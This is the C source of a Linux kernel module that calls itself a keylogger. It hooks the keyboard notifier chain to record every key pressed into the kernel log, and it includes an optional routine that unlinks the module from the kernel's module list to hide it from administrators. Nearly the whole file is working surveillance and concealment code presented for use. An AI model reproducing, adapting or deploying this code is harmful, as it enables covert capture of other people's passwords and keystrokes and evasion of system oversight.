#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/mutex.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mateusz Bauer");
MODULE_DESCRIPTION("Keylogger Linux Driver");

static DEFINE_MUTEX(module_mutex);
bool hide_keylogger = false;
static struct list_head *module_list;

static void hide_module(void)
{
	while (!mutex_trylock(&module_mutex)) {
		cpu_relax();
	}

	module_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);
}

/*
static void show_module(void)
{
	while (!mutex_trylock(&module_mutex)) {
		cpu_relax();
	}

	list_add(&THIS_MODULE->list, module_list);
	mutex_unlock(&module_mutex);
}*/

static int key_pressed(struct notifier_block *nb, unsigned long action, void *data)
{
	struct keyboard_notifier_param *param = data;

	if (KBD_KEYSYM == action && param->down == 1) {
		char c = param->value;
		printk(KERN_INFO "%c", c);	
	}

	return NOTIFY_OK;
}

static struct notifier_block mb_keylogger_nb = {
	.notifier_call = key_pressed
};

static int __init mb_keylogger_init(void) {
	register_keyboard_notifier(&mb_keylogger_nb);

	if (hide_keylogger == true) {
		hide_module();
	}

	printk("MB KEYLOGGER MODULE INSERTED\n");

	return 0;
}

static void __exit mb_keylogger_exit(void) {
	unregister_keyboard_notifier(&mb_keylogger_nb);
	printk("MB KEYLOGGER MODULE REMOVED\n");
}

module_init(mb_keylogger_init);
module_exit(mb_keylogger_exit);

